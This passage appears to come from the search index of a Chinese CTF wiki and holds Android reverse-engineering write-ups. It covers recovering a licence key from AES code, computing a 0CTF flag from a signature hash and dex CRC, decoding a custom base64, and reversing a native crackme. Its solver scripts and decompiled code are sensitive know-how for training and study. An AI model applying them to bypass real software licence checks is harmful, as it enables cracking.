\"29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84\" ; public static String bytesToHexString ( byte [] bArr ) { StringBuilder stringBuilder = new StringBuilder (); int length = bArr . length ; for ( int i = 0 ; i < length ; i ++) { stringBuilder . append ( String . format ( \"%02x\" , new Object []{ Integer . valueOf ( bArr [ i ] & 255 )})); } return stringBuilder . toString (); } public static String encrypt ( String str , String str2 , String str3 ) { String str4 = \"\" ; try { Key secretKeySpec = new SecretKeySpec ( hexStringToBytes ( str2 ), \"AES\" ); Cipher instance = Cipher . getInstance ( CIPHER_ALGORITHM ); instance . init ( 1 , secretKeySpec , new IvParameterSpec ( str3 . getBytes ())); str4 = bytesToHexString ( instance . doFinal ( str . getBytes ())); } catch ( Exception e ) { e . printStackTrace (); } return str4 ; } public static byte [] hexStringToBytes ( String str ) { int length = str . length (); byte [] bArr = new byte [( length / 2 )]; for ( int i = 0 ; i < length ; i += 2 ) { bArr [ i / 2 ] = ( byte ) (( Character . digit ( str . charAt ( i ), 16 ) << 4 ) + Character . digit ( str . charAt ( i + 1 ), 16 )); } return bArr ; } public static boolean isValidLicenceKey ( String str , String str2 , String str3 ) { return encrypt ( str , str2 , str3 ). equals ( VALID_LICENCE ); } } \u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u9996\u5148\u4f7f\u7528\u4e86encrypt\u51fd\u6570\u5bf9\u4e09\u4e2a\u5b57\u7b26\u4e32\u52a0\u5bc6\u3002\u5176\u5b9e\u5c31\u662f\u5229\u7528\u4e0a\u9762\u6240\u8bf4\u7684AES/CBC/PKCS5Padding\u65b9\u6cd5\u52a0\u5bc6\uff0c\u5c06str2\u4f5c\u4e3akey\uff0c\u5c06str3\u4f5c\u4e3a\u521d\u59cb\u5411\u91cf\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u6dfb\u52a0\u89e3\u5bc6\u51fd\u6570\u5982\u4e0b public static String decrypt ( String input , String secretKey , String iv ) { String encryptedText = \"\" ; try { SecretKeySpec secretKeySpec = new SecretKeySpec ( hexStringToBytes ( secretKey ), \"AES\" ); Cipher cipher = Cipher . getInstance ( CIPHER_ALGORITHM ); cipher . init ( 2 , secretKeySpec , new IvParameterSpec ( iv . getBytes ())); encryptedText = bytesToHexString ( cipher . doFinal ( hexStringToBytes ( userInput ))); } catch ( Exception e ) { e . printStackTrace (); } return encryptedText ; } \u7136\u540e\u8fd0\u884c\u5f97\u5230\u6b63\u5e38\u8f93\u5165\u7684product key fl-ag-IS-se-ri-al-NU-MB-ER","title":"\u5206\u6790\u52a0\u5bc6\u4ee3\u7801"},{"location":"android/basic_reverse/static/java-example/#2015-0ctf-vezel","text":"","title":"2015-0CTF-vezel"},{"location":"android/basic_reverse/static/java-example/#_12","text":"\u9996\u5148\uff0c\u5206\u6790\u4ee3\u7801\uff0c\u5982\u4e0b public void confirm(View v) { if(\"0CTF{\" + String.valueOf(this.getSig(this.getPackageName())) + this.getCrc() + \"}\".equals( this.et.getText().toString())) { Toast.makeText(((Context)this), \"Yes!\", 0).show(); } else { Toast.makeText(((Context)this), \"0ops!\", 0).show(); } } private String getCrc() { String v1; try { v1 = String.valueOf(new ZipFile(this.getApplicationContext().getPackageCodePath()).getEntry( \"classes.dex\").getCrc()); } catch(Exception v0) { v0.printStackTrace(); } return v1; } private int getSig(String packageName) { int v4; PackageManager v2 = this.getPackageManager(); int v5 = 64; try { v4 = v2.getPackageInfo(packageName, v5).signatures[0].toCharsString().hashCode(); } catch(Exception v0) { v0.printStackTrace(); } return v4; } \u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u60f3\u8981\u7684flag\u7684\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206 String.valueOf(this.getSig(this.getPackageName())) this.getCrc() \u5176\u4e2d\u7b2c\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u81ea\u5df1\u7f16\u5199\u4e00\u4e2aapp\u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u503c\u3002\u7b2c\u4e8c\u90e8\u5206\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5c06dex\u6587\u4ef6\u63d0\u53d6\u51fa\u6765\uff0c\u5229\u7528\u7f51\u4e0a\u7684\u5de5\u5177\u8ba1\u7b97\u4e00\u4e0b\u3002","title":"\u5206\u6790"},{"location":"android/basic_reverse/static/java-example/#hashcode","text":"\u968f\u4fbf\u627e\u4e86\u4e2a\uff08\u653e\u5728\u5bf9\u5e94\u7684example\u6587\u4ef6\u5939\u4e0b\uff09 package com.iromise.getsignature; import android.content.pm.PackageInfo; import android.content.pm.PackageManager; import android.content.pm.Signature; import android.support.v7.app.AppCompatActivity; import android.os.Bundle; import android.text.TextUtils; import android.util.Log; import android.widget.Toast; public class MainActivity extends AppCompatActivity { private StringBuilder builder; public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); PackageManager manager = getPackageManager(); builder = new StringBuilder(); String pkgname = \"com.ctf.vezel\"; boolean isEmpty = TextUtils.isEmpty(pkgname); if (isEmpty) { Toast.makeText(this, \"\u5e94\u7528\u7a0b\u5e8f\u7684\u5305\u540d\u4e0d\u80fd\u4e3a\u7a7a\uff01\", Toast.LENGTH_SHORT); } else { try { PackageInfo packageInfo = manager.getPackageInfo(pkgname, PackageManager.GET_SIGNATURES); Signature[] signatures = packageInfo.signatures; Log.i(\"hashcode\", String.valueOf(signatures[0].toCharsString().hashCode())); } catch (PackageManager.NameNotFoundException e) { e.printStackTrace(); } } } } \u7136\u540e\u518dddms\u4e2d\u8fc7\u6ee4\u51fahashcode 07-18 11:05:11.895 16124-16124/? I/hashcode: -183971537 \u6ce8\uff1a\u5176\u5b9e\u8fd9\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u5199\u6210\u4e00\u4e2a\u5c0f\u7684app\uff0c\u5f88\u591a\u7a0b\u5e8f\u90fd\u4f1a\u8ba1\u7b97\u7b7e\u540d\u3002","title":"hashcode"},{"location":"android/basic_reverse/static/java-example/#classesdex-crc32","text":"\u968f\u4fbf\u627e\u4e2a\u5728\u7ebf\u7f51\u7ad9\u83b7\u53d6\u4e00\u4e0b classes.dex \u7684CRC32\u503c\u3002 CRC-32 46e26557 MD5 Hash 3217b0ad6c769233ea2a49d17885b5ba SHA1 Hash ec3b4730654248a02b016d00c9ae2425379bf78f SHA256 Hash 6fb1df4dacc95312ec72d8b79d22529e1720a573971f866bbf8963b01499ecf8 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u9700\u8981\u8f6c\u6210\u5341\u8fdb\u5236 >>> print int(\"46E26557\", 16) 1189242199","title":"classes.dex crc32"},{"location":"android/basic_reverse/static/java-example/#flag","text":"\u4e24\u90e8\u5206\u7b97\u5b8c\u5408\u8d77\u6765\u5c31\u662fFlag Flag\uff1a0ctf{-1839715371189242199}","title":"flag"},{"location":"android/basic_reverse/static/java-example/#2017-xman-hellosmali2","text":"\u7ed9\u7684\u662f\u4e00\u4e2a smali \u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u601d\u8def\u6765\u505a \u5229\u7528 smali.jar \u5c06 smali \u6c47\u7f16\u4e3a dex \u6587\u4ef6\u3002 java -jar smali.jar assemble src.smali -o src.dex \u4f7f\u7528 jadx \u53cd\u7f16\u8bd1 dex\uff0c\u5982\u4e0b package com.example.hellosmali.hellosmali ; public class Digest { public static boolean check ( String input ) { String str = \"+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\" ; if ( input == null || input . length () == 0 ) { return false ; } int i ; char [] charinput = input . toCharArray (); StringBuilder v2 = new StringBuilder (); for ( char toBinaryString : charinput ) { String intinput = Integer . toBinaryString ( toBinaryString ); while ( intinput . length () < 8 ) { intinput = \"0\" + intinput ; } v2 . append ( intinput ); } while ( v2 . length () % 6 != 0 ) { v2 . append ( \"0\" ); } String v1 = String . valueOf ( v2 ); char [] v4 = new char [( v1 . length () / 6 )]; for ( i = 0 ; i < v4 . length ; i ++) { int v6 = Integer . parseInt ( v1 . substring ( 0 , 6 ), 2 ); v1 = v1 . substring ( 6 ); v4 [ i ] = str . charAt ( v6 ); } StringBuilder v3 = new StringBuilder ( String . valueOf ( v4 )); if ( input . length () % 3 == 1 ) { v3 . append ( \"!?\" ); } else if ( input . length () % 3 == 2 ) { v3 . append ( \"!\" ); } if ( String . valueOf ( v3 ). equals ( \"xsZDluYYreJDyrpDpucZCo!?\" )) { return true ; } return false ; } } \u7b80\u5355\u770b\u4e00\u4e0b\uff0c\u5176\u5b9e\u662f\u4e00\u4e2a\u53d8\u79cd\u7684 base64 \u52a0\u5bc6\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u7f51\u4e0a\u627e\u4e00\u4e2a base64 \u7f16\u7801\uff0c\u7136\u540e\u8bbe\u7f6e\u4e00\u4e0b\u5c31\u597d\u4e86\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u811a\u672c\u6765\u81ea\u4e8e http://www.cnblogs.com/crazyrunning/p/7382693.html \u3002 #coding=utf8 import string base64_charset = '+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' def decode ( base64_str ): \"\"\" \u89e3\u7801base64\u5b57\u7b26\u4e32 :param base64_str:base64\u5b57\u7b26\u4e32 :return:\u89e3\u7801\u540e\u7684bytearray\uff1b\u82e5\u5165\u53c2\u4e0d\u662f\u5408\u6cd5base64\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u7a7abytearray \"\"\" # \u5bf9\u6bcf\u4e00\u4e2abase64\u5b57\u7b26\u53d6\u4e0b\u6807\u7d22\u5f15\uff0c\u5e76\u8f6c\u6362\u4e3a6\u4e3a\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 base64_bytes = [ '{:0>6}' . format ( str ( bin ( base64_charset . index ( s ))) . replace ( '0b' , '' )) for s in base64_str if s != '=' ] resp = bytearray () nums = len ( base64_bytes ) // 4 remain = len ( base64_bytes ) % 4 integral_part = base64_bytes [ 0 : 4 * nums ] while integral_part : # \u53d64\u4e2a6\u4f4dbase64\u5b57\u7b26\uff0c\u4f5c\u4e3a3\u4e2a\u5b57\u8282 tmp_unit = '' . join ( integral_part [ 0 : 4 ]) tmp_unit = [ int ( tmp_unit [ x : x + 8 ], 2 ) for x in [ 0 , 8 , 16 ]] for i in tmp_unit : resp . append ( i ) integral_part = integral_part [ 4 :] if remain : remain_part = '' . join ( base64_bytes [ nums * 4 :]) tmp_unit = [ int ( remain_part [ i * 8 :( i + 1 ) * 8 ], 2 ) for i in range ( remain - 1 )] for i in tmp_unit : resp . append ( i ) return resp if __name__ == \"__main__\" : print decode ( 'A0NDlKJLv0hTA1lDAuZRgo==' ) \u7ed3\u679c\u5982\u4e0b \u279c tmp python test.py eM_5m4Li_i4_Ea5y","title":"2017 XMAN HelloSmali2"},{"location":"android/basic_reverse/static/java-example/#_13","text":"GCTF 2017 Android1 GCTF 2017 Android2 ISG 2017 Crackme XMAN 2017 mobile3 rev1","title":"\u9898\u76ee"},{"location":"android/basic_reverse/static/so-example/","text":"\u9759\u6001\u5206\u6790\u539f\u751f\u5c42\u7a0b\u5e8f \u00b6 \u57fa\u672c\u65b9\u6cd5 \u00b6 \u9759\u6001\u5206\u6790\u539f\u751f\u5c42\u7a0b\u5e8f\u57fa\u672c\u7684\u8fc7\u7a0b\u5982\u4e0b \u63d0\u53d6 so \u6587\u4ef6 ida \u53cd\u7f16\u8bd1 so \u6587\u4ef6\u9605\u8bfb so \u4ee3\u7801 \u6839\u636e java \u5c42\u7684\u4ee3\u7801\u6765\u5206\u6790 so \u4ee3\u7801\u3002 \u6839\u636e so \u4ee3\u7801\u7684\u903b\u8f91\u8f85\u52a9\u6574\u4e2a\u7a0b\u5e8f\u7684\u5206\u6790\u3002 \u539f\u751f\u5c42\u9759\u6001\u5206\u6790\u4f8b\u5b50 \u00b6 2015-\u6d77\u5ce1\u4e24\u5cb8-\u4e00\u4e2aAPK\uff0c\u9006\u5411\u8bd5\u8bd5\u5427 \u00b6 \u53cd\u7f16\u8bd1 \u00b6 \u5229\u7528jadx\u53cd\u7f16\u8bd1apk\uff0c\u786e\u5b9a\u5e94\u7528\u7684\u4e3b\u6d3b\u52a8 <?xml version=\"1.0\" encoding=\"utf-8\"?> <manifest xmlns:android= \"http://schemas.android.com/apk/res/android\" xmlns:app= \"http://schemas.android.com/apk/res-auto\" android:versionCode= \"1\" android:versionName= \"1.0\" package= \"com.example.mobicrackndk\" > <uses-sdk android:minSdkVersion= \"8\" android:targetSdkVersion= \"17\" /> <application android:theme= \"@style/AppTheme\" android:label= \"@string/app_name\" android:icon= \"@drawable/ic_launcher\" android:allowBackup= \"true\" > <activity android:label= \"@string/app_name\" android:name= \"com.example.mobicrackndk.CrackMe\" > <intent-filter> <action android:name= \"android.intent.action.MAIN\" /> <category android:name= \"android.intent.category.LAUNCHER\" /> </intent-filter> </activity> </application> </manifest> \u4e0d\u96be\u770b\u51fa\uff0c\u7a0b\u5e8f\u7684\u4e3b\u6d3b\u52a8\u4e3a com.example.mobicrackndk.CrackMe\u3002 \u5206\u6790\u4e3b\u6d3b\u52a8 \u00b6 \u4e0d\u96be\u770b\u51fa\uff0c\u7a0b\u5e8f\u7684\u57fa\u672c\u60c5\u51b5\u5c31\u662f\u5229\u7528 native \u51fd\u6570 testFlag \u5224\u65ad\u7528\u6237\u4f20\u5165\u7684 pwdEditText \u662f\u5426\u6ee1\u8db3\u8981\u6c42\u3002 public native boolean testFlag ( String str ); static { System . loadLibrary ( \"mobicrackNDK\" ); } protected void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView (( int ) R . layout . activity_crack_me ); this . inputButton = ( Button ) findViewById ( R . id . input_button ); this . pwdEditText = ( EditText ) findViewById ( R . id . pwd ); this . inputButton . setOnClickListener ( new OnClickListener () { public void onClick ( View v ) { CrackMe . this . input = CrackMe . this . pwdEditText . getText (). toString (); if ( CrackMe . this . input == null ) { return ; } if ( CrackMe . this . testFlag ( CrackMe . this . input )) { Toast . makeText ( CrackMe . this , CrackMe . this . input , 1 ). show (); } else { Toast . makeText ( CrackMe . this , \"Wrong flag\" , 1 ). show (); } } }); } \u5206\u6790so\u6587\u4ef6 \u00b6 \u81ea\u7136\u6211\u4eec\u9996\u5148\u4f1a\u53bb\u76f4\u63a5\u627e testFlag \u51fd\u6570\uff0c\u51e1\u662f\u5e76\u6ca1\u6709\u76f4\u63a5\u627e\u5230\u3002\u6211\u4eec\u53ea\u597d\u9996\u5148\u5206\u6790 JNI_Onload \u51fd\u6570\uff0c\u5982\u4e0b signed int __fastcall JNI_OnLoad ( JNIEnv * a1 ) { JNIEnv * v1 ; // r4 int v2 ; // r5 char * v3 ; // r7 int v4 ; // r1 const char * v5 ; // r1 int v7 ; // [sp+Ch] [bp-1Ch] v1 = a1 ; v7 = 0 ; printf ( \"JNI_OnLoad\" ); if ( (( * v1 ) -> FindClass )( v1 , & v7 , 65540 ) ) goto LABEL_7 ; v2 = v7 ; v3 = classPathName [ 0 ]; fprintf (( & _sF + 168 ), \"RegisterNatives start for '%s'\" , classPathName [ 0 ]); v4 = ( * ( * v2 + 24 ))( v2 , v3 ); if ( ! v4 ) { v5 = \"Native registration unable to find class '%s'\" ; LABEL_6 : fprintf (( & _sF + 168 ), v5 , v3 ); LABEL_7 : fputs ( \"GetEnv failed\" , ( & _sF + 168 )); return - 1 ; } if ( ( * ( * v2 + 860 ))( v2 , v4 , off_400C , 2 ) < 0 ) { v5 = \"RegisterNatives failed for '%s'\" ; goto LABEL_6 ; } return 65540 ; } \u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u5728\u8fd9\u91cc\u52a8\u6001\u6ce8\u518c\u4e86\u7c7b\u548c\u76f8\u5e94\u7684\u51fd\u6570 off_400C\u3002\u4ed4\u7ec6\u770b\u4e00\u4e0b\u8be5\u51fd\u6570 .data:0000400C off_400C DCD aTestflag ; DATA XREF: JNI_OnLoad+68\u2191o .data:0000400C ; .text:off_1258\u2191o .data:0000400C ; \"testFlag\" .data:00004010 DCD aLjavaLangStrin_0 ; \"(Ljava/lang/String;)Z\" .data:00004014 DCD abcdefghijklmn+1 .data:00004018 DCD aHello ; \"hello\" .data:0000401C DCD aLjavaLangStrin_1 ; \"()Ljava/lang/String;\" .data:00004020 DCD native_hello+1 .data:00004020 ; .data ends \u53ef\u4ee5\u53d1\u73b0\uff0c\u786e\u5b9e\u5c31\u662f testflag \u51fd\u6570\uff0c\u5176\u5bf9\u5e94\u7684\u51fd\u6570\u540d\u4e3a abcdefghijklmn\u3002 \u5206\u6790abcdefghijklmn \u00b6 \u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u4e3b\u8981\u5728\u4e09\u4e2a\u90e8\u5206\u5bf9\u8f93\u5165\u7684 v10 \u8fdb\u884c\u4e86\u5224\u65ad \u5224\u65ad1 if ( strlen ( v10 ) == 16 ) \u8bf4\u660e\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u4e3a16\u3002 \u5224\u65ad2 v3 = 0 ; do { s2 [ v3 ] = v10 [ v3 ] - v3 ; ++ v3 ; } while ( v3 != 8 ); v2 = 0 ; v12 = 0 ; if ( ! strcmp ( seed [ 0 ], s2 ) ) \u5224\u65ad3 v9 = (( * jniEnv ) -> FindClass )(); if ( ! v9 ) { v4 = \"class,failed\" ; LABEL_11 : _android_log_print ( 4 , \"log\" , v4 ); exit ( 1 ); } v5 = (( * jniEnv ) -> GetStaticMethodID )(); if ( ! v5 ) { v4 = \"method,failed\" ; goto LABEL_11 ; } _JNIEnv :: CallStaticVoidMethod ( jniEnv , v9 , v5 ); v6 = (( * v1 ) -> GetStaticFieldID )( v1 , v9 , \"key\" , \"Ljava/lang/String;\" ); if ( ! v6 ) _android_log_print ( 4 , \"log\" , \"fid,failed\" ); (( * v1 ) -> GetStaticObjectField )( v1 , v9 , v6 ); v7 = (( * jniEnv ) -> GetStringUTFChars )(); while ( v3 < strlen ( v7 ) + 8 ) { v13 [ v3 - 8 ] = v10 [ v3 ] - v3 ; ++ v3 ; } v14 = 0 ; v2 = strcmp ( v7 , v13 ) <= 0 ; \u6839\u636e\u6c47\u7f16\u4ee3\u7801\uff0c\u53ef\u77e5\u7b2c\u4e09\u4e2a\u5224\u65ad\u4e2d\u8c03\u7528\u4e86calcKey\u7c7b\u4e2d\u7684\u9759\u6001\u65b9\u6cd5 .text: 00001070 LDR R0 , [ R5 ] .text: 00001072 LDR R2 , = ( aCalckey - 0x1080 ) .text: 00001074 LDR R3 , = ( aV - 0x1084 ) .text: 00001076 LDR R4 , [ R0 ] .text: 00001078 MOVS R1 , #0x1C4 .text : 0000107 C ADD R2 , PC ; \"calcKey\" .text : 0000107 E LDR R4 , [ R4 , R1 ] .text: 00001080 ADD R3 , PC ; \"()V\" \u5e76\u5728\u4e4b\u540e\u83b7\u5f97\u4e86key\u7684\u5185\u5bb9\u3002 public static String key ; public static void calcKey () { key = new StringBuffer ( \"c7^WVHZ,\" ). reverse (). toString (); } } \u83b7\u53d6flag \u00b6 \u6839\u636e\u8fd9\u4e09\u4e2a\u5224\u65ad\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u5185\u5bb9 s = \"QflMn`fH,ZHVW^7c\" flag = \"\" for idx , c in enumerate ( s ): flag += chr ( ord ( c ) + idx ) print flag \u7ed3\u679c\u5982\u4e0b QgnPrelO4cRackEr \u8f93\u5165\u4e4b\u540e\u5e76\u4e0d\u5bf9\u3002 \u518d\u6b21\u5206\u6790 \u00b6 \u60f3\u5230\u8fd9\u91cc\u5c31\u8981\u8003\u8651\u4e0b\uff0c\u7a0b\u5e8f\u662f\u4e0d\u662f\u5728\u54ea\u91cc\u4fee\u6539\u4e86\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002\u8fd9\u91cc\u9996\u5148\u770b\u4e00\u4e0bseed\u3002\u5bf9 x \u8fdb\u884c\u4ea4\u53c9\u5f15\u7528\uff0c\u53d1\u73b0\u5176\u5728 _init_my \u4e2d\u4f7f\u7528\u4e86\uff0c\u5982\u4e0b size_t _init_my () { size_t i ; // r7 char * v1 ; // r4 size_t result ; // r0 for ( i = 0 ; ; ++ i ) { v1 = seed [ 0 ]; result = strlen ( seed [ 0 ]); if ( i >= result ) break ; t [ i ] = v1 [ i ] - 3 ; } seed [ 0 ] = t ; byte_4038 = 0 ; return result ; } \u6240\u4ee5\u6700\u521d\u7a0b\u5e8f\u5bf9 seed \u8fdb\u884c\u4e86\u4fee\u6539\u3002 \u518d\u6b21\u83b7\u53d6flag \u00b6 \u4fee\u6539\u811a\u672c\u5982\u4e0b s = \"QflMn`fH,ZHVW^7c\" flag = \"\" for idx , c in enumerate ( s ): tmp = ord ( c ) if idx < 8 : tmp -= 3 flag += chr ( tmp + idx ) print flag flag \u5982\u4e0b \u279c 2015-\u6d77\u5ce1\u4e24\u5cb8\u4e00\u4e2aAPK\uff0c\u9006\u5411\u8bd5\u8bd5\u5427 python exp.py NdkMobiL4cRackEr \u5f53\u7136\u8be5\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528\u52a8\u6001\u8c03\u8bd5\u3002","title":"Android Native \u5c42\u9759\u6001\u5206\u6790"},{"location":"android/basic_reverse/static/so-example/#_1","text":"","title":"\u9759\u6001\u5206\u6790\u539f\u751f\u5c42\u7a0b\u5e8f"},{"location":"android/basic_reverse/static/so-example/#_2","text":"\u9759\u6001\u5206\u6790\u539f\u751f\u5c42\u7a0b\u5e8f\u57fa\u672c\u7684\u8fc7\u7a0b\u5982\u4e0b \u63d0\u53d6 so \u6587\u4ef6 ida \u53cd\u7f16\u8bd1 so \u6587\u4ef6\u9605\u8bfb so \u4ee3\u7801 \u6839\u636e java \u5c42\u7684\u4ee3\u7801\u6765\u5206\u6790 so \u4ee3\u7801\u3002 \u6839\u636e so \u4ee3\u7801\u7684\u903b\u8f91\u8f85\u52a9\u6574\u4e2a\u7a0b\u5e8f\u7684\u5206\u6790\u3002","title":"\u57fa\u672c\u65b9\u6cd5"},{"location":"android/basic_reverse/static/so-example/#_3","text":"","title":"\u539f\u751f\u5c42\u9759\u6001\u5206\u6790\u4f8b\u5b50"},{"location":"android/basic_reverse/static/so-example/#2015-apk","text":"","title":"2015-\u6d77\u5ce1\u4e24\u5cb8-\u4e00\u4e2aAPK\uff0c\u9006\u5411\u8bd5\u8bd5\u5427"},{"location":"android/basic_reverse/static/so-example/#_4","text":"\u5229\u7528jadx\u53cd\u7f16\u8bd1apk\uff0c\u786e\u5b9a\u5e94\u7528\u7684\u4e3b\u6d3b\u52a8 <?xml version=\"1.0\" encoding=\"utf-8\"?> <manifest xmlns:android= \"http://schemas.android.com/apk/res/android\" xmlns:app= \"http://schemas.android.com/apk/res-auto\" android:versionCode= \"1\" android:versionName= \"1.0\" package= \"com.example.mobicrackndk\" > <uses-sdk android:minSdkVersion= \"8\" android:targetSdkVersion= \"17\" /> <application android:theme= \"@style/AppTheme\" android:label= \"@string/app_name\" android:icon= \"@drawable/ic_launcher\" android:allowBackup= \"true\" > <activity android:label= \"@string/app_name\" android:name= \"com.example.mobicrackndk.CrackMe\" > <intent-filter> <action android:name= \"android.intent.action.MAIN\" /> <category android:name= \"android.intent.category.LAUNCHER\" /> </intent-filter> </activity> </application> </manifest> \u4e0d\u96be\u770b\u51fa\uff0c\u7a0b\u5e8f\u7684\u4e3b\u6d3b\u52a8\u4e3a com.example.mobicrackndk.CrackMe\u3002","title":"\u53cd\u7f16\u8bd1"},{"location":"android/basic_reverse/static/so-example/#_5","text":"\u4e0d\u96be\u770b\u51fa\uff0c\u7a0b\u5e8f\u7684\u57fa\u672c\u60c5\u51b5\u5c31\u662f\u5229\u7528 native \u51fd\u6570 testFlag \u5224\u65ad\u7528\u6237\u4f20\u5165\u7684 pwdEditText \u662f\u5426\u6ee1\u8db3\u8981\u6c42\u3002 public native boolean testFlag ( String str ); static { System . loadLibrary ( \"mobicrackNDK\" ); } protected void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView (( int ) R . layout . activity_crack_me ); this . inputButton = ( Button ) findViewById ( R . id . input_button ); this . pwdEditText = ( EditText ) findViewById ( R . id . pwd ); this . inputButton . setOnClickListener ( new OnClickListener () { public void onClick ( View v ) { CrackMe . this . input = CrackMe . this . pwdEditText . getText (). toString (); if ( CrackMe . this . input == null ) { return ; } if ( CrackMe . this . testFlag ( CrackMe . this . input )) { Toast . makeText ( CrackMe . this , CrackMe . this . input , 1 ). show (); } else { Toast . makeText ( CrackMe . this , \"Wrong flag\" , 1 ). show (); } } }); }","title":"\u5206\u6790\u4e3b\u6d3b\u52a8"},{"location":"android/basic_reverse/static/so-example/#so","text":"\u81ea\u7136\u6211\u4eec\u9996\u5148\u4f1a\u53bb\u76f4\u63a5\u627e testFlag \u51fd\u6570\uff0c\u51e1\u662f\u5e76\u6ca1\u6709\u76f4\u63a5\u627e\u5230\u3002\u6211\u4eec\u53ea\u597d\u9996\u5148\u5206\u6790 JNI_Onload \u51fd\u6570\uff0c\u5982\u4e0b signed int __fastcall JNI_OnLoad ( JNIEnv * a1 ) { JNIEnv * v1 ; // r4 int v2 ; // r5 char * v3 ; // r7 int v4 ; // r1 const char * v5 ; // r1 int v7 ; // [sp+Ch] [bp-1Ch] v1 = a1 ; v7 = 0 ; printf ( \"JNI_OnLoad\" ); if ( (( * v1 ) -> FindClass )( v1 , & v7 , 65540 ) ) goto LABEL_7 ; v2 = v7 ; v3 = classPathName [ 0 ]; fprintf (( & _sF + 168 ), \"RegisterNatives start for '%s'\" , classPathName [ 0 ]); v4 = ( * ( * v2 + 24 ))( v2 , v3 ); if ( ! v4 ) { v5 = \"Native registration unable to find class '%s'\" ; LABEL_6 : fprintf (( & _sF + 168 ), v5 , v3 ); LABEL_7 : fputs ( \"GetEnv failed\" , ( & _sF + 168 )); return - 1 ; } if ( ( * ( * v2 + 860 ))( v2 , v4 , off_400C , 2 ) < 0 ) { v5 = \"RegisterNatives failed for '%s'\" ; goto LABEL_6 ; } return 65540 ; } \u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u5728\u8fd9\u91cc\u52a8\u6001\u6ce8\u518c\u4e86\u7c7b\u548c\u76f8\u5e94\u7684\u51fd\u6570 off_400C\u3002\u4ed4\u7ec6\u770b\u4e00\u4e0b\u8be5\u51fd\u6570 .data:0000400C off_400C DCD aTestflag ; DATA XREF: JNI_OnLoad+68\u2191o .data:0000400C ; .text:off_1258\u2191o .data:0000400C ; \"testFlag\" .data:00004010 DCD aLjavaLangStrin_0 ; \"(Ljava/lang/String;)Z\" .data:00004014 DCD abcdefghijklmn+1 .data:00004018 DCD aHello ; \"hello\" .data:0000401C DCD aLjavaLangStrin_1 ; \"()Ljava/lang/String;\" .data:00004020 DCD native_hello+1 .data:00004020 ; .data ends \u53ef\u4ee5\u53d1\u73b0\uff0c\u786e\u5b9e\u5c31\u662f testflag \u51fd\u6570\uff0c\u5176\u5bf9\u5e94\u7684\u51fd\u6570\u540d\u4e3a abcdefghijklmn\u3002","title":"\u5206\u6790so\u6587\u4ef6"},{"location":"android/basic_reverse/static/so-example/#abcdefghijklmn","text":"\u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u4e3b\u8981\u5728\u4e09\u4e2a\u90e8\u5206\u5bf9\u8f93\u5165\u7684 v10 \u8fdb\u884c\u4e86\u5224\u65ad \u5224\u65ad1 if ( strlen ( v10 ) == 16 ) \u8bf4\u660e\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u4e3a16\u3002 \u5224\u65ad2 v3 = 0 ; do { s2 [ v3 ] = v10 [ v3 ] - v3 ; ++ v3 ; } while ( v3 != 8 ); v2 = 0 ; v12 = 0 ; if ( ! strcmp ( seed [ 0 ], s2 ) ) \u5224\u65ad3 v9 = (( * jniEnv ) -> FindClass )(); if ( ! v9 ) { v4 = \"class,failed\" ; LABEL_11 : _android_log_print ( 4 , \"log\" , v4 ); exit ( 1 ); } v5 = (( * jniEnv ) -> GetStaticMethodID )(); if ( ! v5 ) { v4 = \"method,failed\" ; goto LABEL_11 ; } _JNIEnv :: CallStaticVoidMethod ( jniEnv , v9 , v5 ); v6 = (( * v1 ) -> GetStaticFieldID )( v1 , v9 , \"key\" , \"Ljava/lang/String;\" ); if ( ! v6 ) _android_log_print ( 4 , \"log\" , \"fid,failed\" ); (( * v1 ) -> GetStaticObjectField )( v1 , v9 , v6 ); v7 = (( * jniEnv ) -> GetStringUTFChars )(); while ( v3 < strlen ( v7 ) + 8 ) { v13 [ v3 - 8 ] = v10 [ v3 ] - v3 ; ++ v3 ; } v14 = 0 ; v2 = strcmp ( v7 , v13 ) <= 0 ; \u6839\u636e\u6c47\u7f16\u4ee3\u7801\uff0c\u53ef\u77e5\u7b2c\u4e09\u4e2a\u5224\u65ad\u4e2d\u8c03\u7528\u4e86calcKey\u7c7b\u4e2d\u7684\u9759\u6001\u65b9\u6cd5 .text: 00001070 LDR R0 , [ R5 ] .text: 00001072 LDR R2 , = ( aCalckey - 0x1080 ) .text: 00001074 LDR R3 , = ( aV - 0x1084 ) .text: 00001076 LDR R4 , [ R0 ] .text: 00001078 MOVS R1 , #0x1C4 .text : 0000107 C ADD R2 , PC ; \"calcKey\" .text : 0000107 E LDR R4 , [ R4 , R1 ] .text: 00001080 ADD R3 , PC ; 